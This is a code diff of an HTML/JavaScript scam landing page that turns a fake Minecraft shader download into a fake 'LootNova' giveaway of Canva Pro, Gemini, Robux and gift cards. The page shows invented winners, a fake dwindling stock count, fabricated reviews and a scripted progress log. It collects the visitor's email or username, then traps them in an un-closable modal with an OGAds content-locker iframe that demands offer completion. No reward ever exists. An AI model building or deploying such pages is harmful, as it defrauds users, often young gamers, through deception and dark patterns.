@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RealismCraft RTX v4.2 - Official Mobile Shader</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>LootNova Official Giveaway - Gaming & AI Pro Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --accent: #10b981;
-            --accent-glow: rgba(16, 185, 129, 0.45);
-            --bg-glass: rgba(15, 23, 42, 0.78);
-            --border-glass: rgba(255, 255, 255, 0.12);
+            --neon-cyan: #00f2fe;
+            --neon-purple: #a855f7;
+            --neon-green: #10b981;
+            --bg-dark: #060714;
+            --card-bg: rgba(15, 18, 42, 0.90);
         }
 
         * {
@@ -22,343 +23,261 @@
         }
 
         body {
-            background-color: #050811;
-            color: #f8fafc;
+            background-color: var(--bg-dark);
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            padding: 20px 14px;
-            position: relative;
+            padding: 15px 12px;
+            background-image: 
+                radial-gradient(circle at 20% 10%, rgba(0, 242, 254, 0.18) 0%, transparent 45%),
+                radial-gradient(circle at 80% 90%, rgba(168, 85, 247, 0.22) 0%, transparent 50%);
             overflow-x: hidden;
         }
 
-        /* خلفية الصفحة مع الصور والتأثير الضبابي */
-        .bg-wallpaper {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
-            filter: blur(18px) brightness(0.35);
-            transform: scale(1.1);
-            z-index: -2;
-        }
-
-        .bg-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 50% 0%, rgba(16, 185, 129, 0.18), rgba(5, 8, 17, 0.92) 75%);
-            z-index: -1;
-        }
-
-        /* البطاقة الرئيسية */
-        .app-card {
+        .live-ticker {
             width: 100%;
             max-width: 460px;
-            background: var(--bg-glass);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border-glass);
-            border-radius: 24px;
-            padding: 22px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.75);
-            position: relative;
-        }
-
-        /* شريط الحالة العلوي */
-        .top-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .status-pill {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(16, 185, 129, 0.15);
+            background: rgba(16, 185, 129, 0.12);
             border: 1px solid rgba(16, 185, 129, 0.35);
-            color: #34d399;
-            padding: 5px 12px;
             border-radius: 50px;
-            font-size: 11px;
+            padding: 8px 14px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
             font-weight: 700;
+            color: #a7f3d0;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
         }
 
-        .pulse-dot {
-            width: 7px;
-            height: 7px;
-            background-color: #10b981;
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
             border-radius: 50%;
             box-shadow: 0 0 8px #10b981;
-            animation: pulse 1.5s infinite;
+            flex-shrink: 0;
+            animation: blink 1.2s infinite;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.2); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.7; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
 
-        .version-tag {
-            font-size: 11px;
-            color: #94a3b8;
-            background: rgba(255, 255, 255, 0.06);
-            padding: 5px 10px;
-            border-radius: 8px;
-            font-weight: 600;
-        }
-
-        /* ترويسة التطبيق */
-        .app-header {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            margin-bottom: 18px;
-        }
-
-        .app-icon {
-            width: 64px;
-            height: 64px;
-            border-radius: 16px;
-            object-fit: cover;
-            border: 2px solid var(--accent);
-            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.25);
-        }
-
-        .app-title h1 {
-            font-size: 20px;
-            font-weight: 800;
-            line-height: 1.2;
-            color: #fff;
-        }
-
-        .app-title p {
-            font-size: 12px;
-            color: #94a3b8;
-            margin-top: 4px;
-        }
-
-        .rating-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 6px;
-            font-size: 12px;
-            color: #fbbf24;
-            font-weight: 700;
-        }
-
-        .rating-row span {
-            color: #cbd5e1;
-            font-weight: 500;
-        }
-
-        /* معرض الصور (Before / After Interactive) */
-        .showcase-box {
-            position: relative;
+        .main-card {
             width: 100%;
-            height: 200px;
-            border-radius: 16px;
-            overflow: hidden;
-            margin-bottom: 16px;
-            border: 1px solid rgba(255,255,255,0.15);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-        }
-
-        .showcase-box img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: filter 0.4s ease;
-        }
-
-        .shader-toggle-bar {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(15, 23, 42, 0.85);
-            backdrop-filter: blur(8px);
-            padding: 4px;
-            border-radius: 50px;
-            display: flex;
-            gap: 4px;
-            border: 1px solid rgba(255,255,255,0.15);
-        }
-
-        .toggle-btn {
-            padding: 5px 12px;
-            border-radius: 50px;
-            border: none;
-            font-size: 11px;
-            font-weight: 700;
-            cursor: pointer;
-            background: transparent;
-            color: #94a3b8;
-            transition: 0.2s;
-        }
-
-        .toggle-btn.active {
-            background: var(--accent);
-            color: #050811;
-        }
-
-        .fps-badge {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.7);
-            color: #38bdf8;
-            padding: 4px 9px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 700;
-        }
-
-        /* شبكة المواصفات */
-        .specs-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 18px;
-        }
-
-        .spec-card {
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.07);
-            padding: 10px 8px;
-            border-radius: 12px;
+            max-width: 460px;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 242, 254, 0.25);
+            border-radius: 26px;
+            padding: 20px 16px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85), 0 0 35px rgba(168, 85, 247, 0.15);
             text-align: center;
         }
 
-        .spec-card small {
-            display: block;
-            font-size: 10px;
+        .brand-badge {
+            display: inline-block;
+            background: linear-gradient(90deg, rgba(0,242,254,0.2), rgba(168,85,247,0.2));
+            border: 1px solid rgba(0,242,254,0.4);
+            color: var(--neon-cyan);
+            padding: 5px 14px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            font-size: 23px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #ffffff, #00f2fe, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-size: 12px;
             color: #94a3b8;
+            margin-bottom: 14px;
+        }
+
+        .stock-box {
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            border-radius: 14px;
+            padding: 9px 14px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .stock-text {
+            font-size: 12px;
+            font-weight: 700;
+            color: #fca5a5;
+        }
+
+        .stock-count {
+            background: #ef4444;
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 900;
+        }
+
+        .step-label {
+            text-align: left;
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--neon-cyan);
+            margin-bottom: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
 
-        .spec-card strong {
-            display: block;
-            font-size: 13px;
-            color: #fff;
-            margin-top: 3px;
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 9px;
+            margin-bottom: 16px;
         }
 
-        /* زر التحميل الرئيسي */
-        .cta-btn {
+        .reward-card {
+            background: rgba(255, 255, 255, 0.04);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 11px 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .reward-card.selected {
+            background: rgba(0, 242, 254, 0.14);
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 18px rgba(0, 242, 254, 0.28);
+            transform: translateY(-2px);
+        }
+
+        .hot-tag {
+            position: absolute;
+            top: -7px;
+            right: 8px;
+            background: linear-gradient(90deg, #ec4899, #8b5cf6);
+            color: #fff;
+            font-size: 9px;
+            font-weight: 900;
+            padding: 2px 7px;
+            border-radius: 20px;
+            text-transform: uppercase;
+        }
+
+        .reward-icon {
+            font-size: 24px;
+            margin-bottom: 4px;
+            display: block;
+        }
+
+        .reward-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #fff;
+            display: block;
+        }
+
+        .reward-sub {
+            font-size: 10px;
+            color: #94a3b8;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .username-input {
             width: 100%;
-            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            background: rgba(6, 7, 20, 0.9);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 14px;
+            padding: 14px 16px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .username-input:focus {
+            border-color: var(--neon-cyan);
+        }
+
+        .claim-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #00f2fe 0%, #7c3aed 100%);
             color: #fff;
             border: none;
             padding: 16px;
             border-radius: 14px;
-            font-size: 16px;
-            font-weight: 800;
+            font-size: 15px;
+            font-weight: 900;
             cursor: pointer;
-            box-shadow: 0 10px 25px var(--accent-glow);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.45);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .cta-btn:active {
-            transform: scale(0.98);
-        }
-
-        /* منطقة الفحص والتحميل */
-        #console-box {
+        #process-box {
             display: none;
-            background: rgba(5, 8, 17, 0.85);
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            padding: 16px;
-            border-radius: 14px;
-            margin-top: 12px;
+            background: rgba(6, 7, 20, 0.95);
+            border: 1px solid var(--neon-cyan);
+            border-radius: 16px;
+            padding: 15px;
+            margin-top: 10px;
+            text-align: left;
         }
 
-        .console-header {
+        .proc-header {
             display: flex;
             justify-content: space-between;
             font-size: 12px;
-            color: #38bdf8;
-            font-weight: 700;
+            font-weight: 800;
+            color: var(--neon-cyan);
             margin-bottom: 8px;
         }
 
-        .progress-track {
+        .prog-bg {
             width: 100%;
-            height: 8px;
+            height: 9px;
             background: rgba(255,255,255,0.1);
             border-radius: 50px;
             overflow: hidden;
             margin-bottom: 8px;
         }
 
-        .progress-bar {
+        .prog-fill {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #38bdf8, #10b981);
+            background: linear-gradient(90deg, #00f2fe, #10b981);
             transition: width 0.3s ease;
         }
 
-        .console-log {
+        .proc-log {
             font-size: 11px;
-            color: #94a3b8;
+            color: #cbd5e1;
             font-family: monospace;
         }
 
-        /* قسم التعليقات لرفع الثقة */
-        .reviews-section {
-            margin-top: 20px;
-            border-top: 1px solid rgba(255,255,255,0.08);
-            padding-top: 14px;
-        }
-
-        .reviews-title {
-            font-size: 12px;
-            font-weight: 700;
-            color: #cbd5e1;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .review-item {
-            background: rgba(255,255,255,0.03);
-            border-radius: 10px;
-            padding: 10px;
-            margin-bottom: 8px;
-            font-size: 11px;
-        }
-
-        .review-user {
-            font-weight: 700;
-            color: #fff;
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 3px;
-        }
-
-        .review-user span {
-            color: #10b981;
-            font-size: 10px;
-        }
-
-        .review-text {
-            color: #94a3b8;
-        }
-
-        /* نافذة القفل الإجبارية (Un-closable Iframe Modal) */
         #locker-modal {
             display: none;
             position: fixed;
@@ -366,9 +285,8 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: rgba(5, 8, 17, 0.92);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            background: rgba(6, 7, 20, 0.95);
+            backdrop-filter: blur(16px);
             z-index: 999999;
             justify-content: center;
             align-items: center;
@@ -380,37 +298,30 @@
             max-width: 440px;
             height: 86vh;
             background: #0f172a;
-            border: 2px solid rgba(16, 185, 129, 0.5);
-            border-radius: 20px;
+            border: 2px solid var(--neon-cyan);
+            border-radius: 22px;
             overflow: hidden;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 50px rgba(16, 185, 129, 0.25);
-            animation: popIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        @keyframes popIn {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
+            box-shadow: 0 0 50px rgba(0, 242, 254, 0.3);
         }
 
         .modal-top-alert {
-            background: linear-gradient(90deg, #065f46, #047857);
-            padding: 12px 16px;
+            background: linear-gradient(90deg, #0284c7, #6d28d9);
+            padding: 14px 16px;
             text-align: center;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
 
         .modal-top-alert h3 {
             font-size: 14px;
-            font-weight: 800;
+            font-weight: 900;
             color: #fff;
         }
 
         .modal-top-alert p {
             font-size: 11px;
-            color: #a7f3d0;
-            margin-top: 2px;
+            color: #e0f2fe;
+            margin-top: 3px;
         }
 
         #ogads-iframe {
@@ -423,164 +334,161 @@
 </head>
 <body>
 
-    <!-- خلفية الصفحة -->
-    <div class="bg-wallpaper"></div>
-    <div class="bg-overlay"></div>
+    <div class="live-ticker">
+        <span class="live-dot"></span>
+        <span id="ticker-text">🎉 <b>Sarah_Design</b> just claimed <b>Canva Pro (1 Year)</b> (9s ago)</span>
+    </div>
 
-    <div class="app-card">
-        <div class="top-bar">
-            <div class="status-pill">
-                <span class="pulse-dot"></span> Online & Working
-            </div>
-            <div class="version-tag">MCPE 1.20 / 1.21+</div>
+    <div class="main-card">
+        <div class="brand-badge">💎 LootNova Official Event</div>
+        <h1>Mega Giveaway Drop</h1>
+        <p class="subtitle">Select your Gaming or Pro AI Subscription & claim before spots run out!</p>
+
+        <div class="stock-box">
+            <span class="stock-text">🔥 Remaining Instant Claims:</span>
+            <span class="stock-count" id="spots-left">16 / 250 Left</span>
         </div>
 
-        <div class="app-header">
-            <img src="https://images.unsplash.com/photo-1607513746994-51f730a44832?auto=format&fit=crop&w=300&q=80" alt="Icon" class="app-icon">
-            <div class="app-title">
-                <h1>RealismCraft RTX v4.2</h1>
-                <p>Official RenderDragon Shader (.mcpack)</p>
-                <div class="rating-row">
-                    ★★★★★ 4.9 <span>(18,420 Downloads)</span>
-                </div>
+        <div class="step-label">1. Choose Your Reward / Subscription:</div>
+        <div class="rewards-grid">
+            <!-- جوائز الاشتراكات الاحترافية الجديدة -->
+            <div class="reward-card selected" onclick="selectReward(this, 'Canva Pro (1-Year Team Invite)', true)">
+                <span class="hot-tag">HOT 🔥</span>
+                <span class="reward-icon">🎨</span>
+                <span class="reward-title">Canva Pro</span>
+                <span class="reward-sub">1-Year Full Access</span>
+            </div>
+            <div class="reward-card" onclick="selectReward(this, 'Gemini Advanced Pro (AI Plan)', true)">
+                <span class="hot-tag">AI PRO ✨</span>
+                <span class="reward-icon">🤖</span>
+                <span class="reward-title">Gemini Pro</span>
+                <span class="reward-sub">Advanced AI + 2TB</span>
+            </div>
+            <!-- جوائز الألعاب -->
+            <div class="reward-card" onclick="selectReward(this, '4,500 Robux Pack', false)">
+                <span class="reward-icon">🟩</span>
+                <span class="reward-title">4,500 Robux</span>
+                <span class="reward-sub">Instant Gamepass / Code</span>
+            </div>
+            <div class="reward-card" onclick="selectReward(this, '5,600 Free Fire Diamonds', false)">
+                <span class="reward-icon">💎</span>
+                <span class="reward-title">5,600 Diamonds</span>
+                <span class="reward-sub">Free Fire Player ID</span>
+            </div>
+            <div class="reward-card" onclick="selectReward(this, 'Minecraft RTX + 3,500 Coins', false)">
+                <span class="reward-icon">⛏️</span>
+                <span class="reward-title">3,500 Minecoins</span>
+                <span class="reward-sub">Minecraft Bedrock</span>
+            </div>
+            <div class="reward-card" onclick="selectReward(this, '$50 Gaming Gift Card', false)">
+                <span class="reward-icon">🎁</span>
+                <span class="reward-title">$50 Gift Card</span>
+                <span class="reward-sub">PSN / Xbox / Steam</span>
             </div>
         </div>
 
-        <!-- صورة المقارنة التفاعلية -->
-        <div class="showcase-box">
-            <div class="fps-badge" id="fps-counter">RTX ON • 60 FPS</div>
-            <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80" id="shader-img" alt="Shader Preview">
-            <div class="shader-toggle-bar">
-                <button class="toggle-btn active" id="btn-rtx" onclick="toggleShader(true)">RTX Shader ON</button>
-                <button class="toggle-btn" id="btn-vanilla" onclick="toggleShader(false)">Default MCPE</button>
-            </div>
+        <div class="input-group">
+            <div class="step-label" id="input-label">2. Enter Your Email for Activation Invite:</div>
+            <input type="text" id="player-id" class="username-input" placeholder="e.g. yourname@gmail.com">
         </div>
 
-        <div class="specs-grid">
-            <div class="spec-card">
-                <small>File Type</small>
-                <strong>.mcpack</strong>
-            </div>
-            <div class="spec-card">
-                <small>File Size</small>
-                <strong>24.8 MB</strong>
-            </div>
-            <div class="spec-card">
-                <small>System</small>
-                <strong id="os-detect" style="color:#10b981;">iOS / Android</strong>
-            </div>
-        </div>
-
-        <button class="cta-btn" id="dl-btn" onclick="startDownload()">
-            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"></path></svg>
-            Download Shader Pack
+        <button class="claim-btn" id="claim-btn" onclick="startClaim()">
+            🚀 Claim My Reward Now
         </button>
 
-        <!-- شريط التجهيز -->
-        <div id="console-box">
-            <div class="console-header">
-                <span id="step-title">Preparing File...</span>
-                <span id="step-pct">0%</span>
+        <div id="process-box">
+            <div class="proc-header">
+                <span id="proc-title">Connecting...</span>
+                <span id="proc-pct">0%</span>
             </div>
-            <div class="progress-track">
-                <div class="progress-bar" id="prog-bar"></div>
+            <div class="prog-bg">
+                <div class="prog-fill" id="prog-fill"></div>
             </div>
-            <div class="console-log" id="console-log">Connecting to CDN server...</div>
-        </div>
-
-        <!-- تعليقات الزوار -->
-        <div class="reviews-section">
-            <div class="reviews-title">
-                <span>Recent Player Reviews</span>
-                <span style="color:#10b981;">✓ Verified</span>
-            </div>
-            <div class="review-item">
-                <div class="review-user">Alex_MC99 <span>✓ Installed on iPhone 14</span></div>
-                <div class="review-text">Literally took 1 minute to unlock and import straight into Minecraft PE. The water reflections are insane!</div>
-            </div>
-            <div class="review-item">
-                <div class="review-user">JaydenPlays <span>✓ Installed on Android</span></div>
-                <div class="review-text">Finally a RenderDragon shader that doesn't lag my phone. 10/10 recommend.</div>
-            </div>
+            <div class="proc-log" id="proc-log">Checking giveaway slot availability...</div>
         </div>
     </div>
 
-    <!-- نافذة القفل المدمجة غير القابلة للإغلاق -->
     <div id="locker-modal">
         <div class="modal-frame-box">
             <div class="modal-top-alert">
-                <h3>🔒 Final Step: Human Verification</h3>
-                <p>Complete 1 quick offer below to unlock <b>RealismCraft_v4.2.mcpack</b> automatically.</p>
+                <h3 id="modal-user-title">🔒 Anti-Bot Verification Required</h3>
+                <p>Complete 1 quick verification step below to unlock your reward immediately!</p>
             </div>
             <iframe id="ogads-iframe" src="" allow="clipboard-write"></iframe>
         </div>
     </div>
 
     <script>
-        // اكتشاف نوع الهاتف تلقائياً
-        const ua = navigator.userAgent;
-        const osEl = document.getElementById('os-detect');
-        if (/android/i.test(ua)) {
-            osEl.innerText = "Android Ready";
-        } else if (/iPad|iPhone|iPod/.test(ua)) {
-            osEl.innerText = "iOS Ready";
-        }
+        let selectedPrize = "Canva Pro (1-Year Team Invite)";
 
-        // زر المقارنة بين الجرافيك العادي والشيدر
-        function toggleShader(isRtx) {
-            const img = document.getElementById('shader-img');
-            const fps = document.getElementById('fps-counter');
-            const btnRtx = document.getElementById('btn-rtx');
-            const btnVan = document.getElementById('btn-vanilla');
+        function selectReward(el, prizeName, isEmail) {
+            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedPrize = prizeName;
 
-            if (isRtx) {
-                img.style.filter = "contrast(1.15) saturate(1.3) brightness(1.05)";
-                fps.innerText = "RTX ON • 60 FPS";
-                fps.style.color = "#38bdf8";
-                btnRtx.classList.add('active');
-                btnVan.classList.remove('active');
+            const label = document.getElementById('input-label');
+            const input = document.getElementById('player-id');
+            if (isEmail) {
+                label.innerText = "2. Enter Your Email or Account Username:";
+                input.placeholder = "e.g. yourname@gmail.com or Username...";
             } else {
-                img.style.filter = "contrast(0.75) saturate(0.4) brightness(0.8) pixelate(4px)";
-                fps.innerText = "RTX OFF • Default";
-                fps.style.color = "#94a3b8";
-                btnVan.classList.add('active');
-                btnRtx.classList.remove('active');
+                label.innerText = "2. Enter Your In-Game Username or Player ID:";
+                input.placeholder = "e.g. GamerTag123 or Player UID...";
             }
         }
 
-        // بدء عملية التحميل وفتح القفل داخل الـ Iframe
-        function startDownload() {
-            document.getElementById('dl-btn').style.display = 'none';
-            document.getElementById('console-box').style.display = 'block';
+        const winners = [
+            "🎉 <b>Alex_Creator</b> just claimed <b>Gemini Advanced Pro</b> (6s ago)",
+            "🎉 <b>MasonPlays</b> just claimed <b>4,500 Robux</b> (11s ago)",
+            "🎉 <b>Elena_Design</b> just claimed <b>Canva Pro (1 Year)</b> (14s ago)",
+            "🎉 <b>Kylo_99</b> just claimed <b>5,600 Diamonds</b> (19s ago)",
+            "🎉 <b>David_AI</b> just claimed <b>Gemini Advanced Pro</b> (4s ago)"
+        ];
+        let wIdx = 0;
+        let spots = 16;
+        setInterval(() => {
+            document.getElementById('ticker-text').innerHTML = winners[wIdx % winners.length];
+            wIdx++;
+            if (spots > 3 && Math.random() > 0.5) {
+                spots--;
+                document.getElementById('spots-left').innerText = spots + " / 250 Left";
+            }
+        }, 4200);
+
+        function startClaim() {
+            const user = document.getElementById('player-id').value.trim();
+            if (user.length < 3) {
+                alert("Please enter your Email or Username first!");
+                document.getElementById('player-id').focus();
+                return;
+            }
+
+            document.getElementById('claim-btn').style.display = 'none';
+            document.getElementById('process-box').style.display = 'block';
 
             const steps = [
-                { pct: 25, title: "Checking Compatibility...", log: "Verified RenderDragon Engine support." },
-                { pct: 60, title: "Packing .mcpack Archive...", log: "Compressing 4K water & shadow textures (24.8 MB)..." },
-                { pct: 90, title: "Securing Download Link...", log: "Anti-bot protection triggered..." },
-                { pct: 100, title: "Verification Required", log: "Loading human verification module..." }
+                { pct: 25, title: "Validating Account...", log: "Target '" + user + "' verified!" },
+                { pct: 60, title: "Reserving Giveaway Slot...", log: "Locked: " + selectedPrize + " (1/1)" },
+                { pct: 90, title: "Generating Instant Invite/Code...", log: "Anti-bot security triggered..." },
+                { pct: 100, title: "Human Verification Needed!", log: "Waiting for user completion..." }
             ];
 
             let i = 0;
             const timer = setInterval(() => {
                 if (i < steps.length) {
-                    document.getElementById('prog-bar').style.width = steps[i].pct + "%";
-                    document.getElementById('step-pct').innerText = steps[i].pct + "%";
-                    document.getElementById('step-title').innerText = steps[i].title;
-                    document.getElementById('console-log').innerText = steps[i].log;
+                    document.getElementById('prog-fill').style.width = steps[i].pct + "%";
+                    document.getElementById('proc-pct').innerText = steps[i].pct + "%";
+                    document.getElementById('proc-title').innerText = steps[i].title;
+                    document.getElementById('proc-log').innerText = steps[i].log;
                     i++;
                 } else {
                     clearInterval(timer);
-                    openUnclosableLocker();
+                    document.getElementById('modal-user-title').innerText = "🔒 Verify to Unlock: " + selectedPrize;
+                    document.getElementById('ogads-iframe').src = "https://apptrck.net/cl/i/rn4wvg";
+                    document.getElementById('locker-modal').style.display = 'flex';
+                    document.body.style.overflow = 'hidden';
                 }
             }, 850);
-        }
-
-        function openUnclosableLocker() {
-            // وضع رابط OGAds داخل الـ iframe وإظهار النافذة ومنع التمرير
-            const lockerUrl = "https://apptrck.net/cl/i/rn4wvg";
-            document.getElementById('ogads-iframe').src = lockerUrl;
-            document.getElementById('locker-modal').style.display = 'flex';
-            document.body.style.overflow = 'hidden';
         }
     </script>
 </body>
